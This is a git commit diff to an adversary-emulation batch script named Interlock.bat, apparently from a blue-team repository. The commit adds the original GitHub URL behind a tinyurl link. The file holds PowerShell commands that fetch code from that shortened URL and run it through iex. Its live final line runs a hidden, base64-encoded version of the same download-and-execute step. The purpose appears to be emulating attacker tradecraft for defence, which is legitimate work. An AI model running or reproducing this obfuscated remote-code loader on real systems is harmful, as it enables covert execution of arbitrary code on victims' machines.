bfa4b0c791d84196972a21120ce54d7a2e8088e6
ZeroDayZealot <95112988+LeMagicKonch@users.noreply.github.com>
2025-08-27 21:06:22 -0400

    Update Interlock.bat

--- Adversary Emulation/scripts/Interlock.bat
+++ Adversary Emulation/scripts/Interlock.bat
@@ -8,7 +8,7 @@
 
 :: Iteration 2:
 ::		Needed to use a URL shortener to fit the command in the run dialog box. I used "tinyurl"
-::			Original URL --> 
+::			Original URL --> https://raw.githubusercontent.com/LeMagicKonch/BlueTeamOps/f755083e31c8b803c331f94d906535a8593ba3e4/Adversary%20Emulation/taskSchedular.bat
 ::			Compressed URL --> https://tinyurl.com/mvyej24r
 ::		Command:
 :: 			powershell.exe -c "iex (iwr -uri https://tinyurl.com/mvyej24r -UseBasicParsing).Content"
@@ -16,3 +16,4 @@
 ::			conhost.exe cmd.exe /c "powershell.exe -w H -e SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AdABpAG4AeQB1AHIAbAAuAGMAbwBtAC8AbQB2AHkAZQBqADIANAByACAAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0AA== /W 1"
 
 conhost.exe cmd.exe /c "powershell.exe -w H -e SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AdABpAG4AeQB1AHIAbAAuAGMAbwBtAC8AbQB2AHkAZQBqADIANAByACAAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0AA== /W 1"
+
